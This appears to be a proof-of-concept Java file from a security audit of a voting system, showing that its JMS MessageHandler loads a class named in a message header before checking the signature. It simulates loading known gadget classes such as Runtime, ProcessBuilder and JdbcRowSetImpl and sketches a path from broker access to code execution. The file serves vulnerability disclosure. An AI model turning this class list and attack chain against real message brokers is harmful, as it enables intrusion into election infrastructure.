/*
 * PoC: SP-058 — Class.forName Before Signature Validation
 *
 * The MessageHandler in both control-component and voting-server
 * calls Class.forName() on a JMS header value BEFORE verifying
 * the message signature.
 *
 * Source files:
 *   control-component/MessageHandler.java:132  — Class.forName(requestMessageType) before line 88 signatureValidator
 *   voting-server/messaging/MessageHandler.java:250 — Class.forName(responseMessageType) in getConfiguration()
 *
 * Attack: An attacker who can inject messages into the JMS broker
 * (e.g., via SP-001 broker credential exposure) can trigger arbitrary
 * class loading. While this alone may not achieve RCE (no gadget chain
 * identified), it enables:
 *   1. ClassNotFoundException-based DoS (crash message processing)
 *   2. Static initializer execution of any class on the classpath
 *   3. Potential deserialization chain if combined with crafted payloads
 *
 * The signature check at line 88 is useless because the class is
 * already loaded and potentially instantiated by then.
 */
public class SP058_ClassForNameInjection {
    public static void main(String[] args) {
        System.out.println("╔══════════════════════════════════════════════════════╗");
        System.out.println("║  SP-058: Class.forName Before Signature Validation   ║");
        System.out.println("╠══════════════════════════════════════════════════════╣");

        // Simulated attack: JMS message with crafted requestMessageType header
        String[] maliciousTypes = {
            "java.lang.Runtime",
            "java.lang.ProcessBuilder",
            "sun.misc.Unsafe",
            "org.springframework.context.support.ClassPathXmlApplicationContext",
            "com.sun.rowset.JdbcRowSetImpl",
            "nonexistent.class.causes.DoS"
        };

        System.out.println("║  Control flow in MessageHandler:                     ║");
        System.out.println("║                                                      ║");
        System.out.println("║  1. requestMessageType = header.get(\"type\")          ║");
        System.out.println("║  2. getConfiguration(requestMessageType)             ║");
        System.out.println("║     → Class.forName(requestMessageType)  ← HERE      ║");
        System.out.println("║  3. payload = deserialize(message)                   ║");
        System.out.println("║  4. signatureValidator.apply(payload)  ← TOO LATE    ║");
        System.out.println("║                                                      ║");
        System.out.println("║  Simulated class loading attempts:                   ║");

        for (String type : maliciousTypes) {
            try {
                Class<?> loaded = Class.forName(type);
                System.out.printf("║  [LOADED]  %-45s ║%n", type);
                System.out.printf("║            → Static init executed, class in JVM     ║%n");
            } catch (ClassNotFoundException e) {
                System.out.printf("║  [DoS]     %-45s ║%n", type);
                System.out.printf("║            → ClassNotFoundException thrown           ║%n");
            }
        }

        System.out.println("╠══════════════════════════════════════════════════════╣");
        System.out.println("║  Impact chain:                                       ║");
        System.out.println("║  JMS broker access → Craft message with type header  ║");
        System.out.println("║  → Class.forName loads before signature check        ║");
        System.out.println("║  → Static initializer executes                       ║");
        System.out.println("║  → If JNDI/deserialization gadget exists → RCE       ║");
        System.out.println("╚══════════════════════════════════════════════════════╝");
    }
}
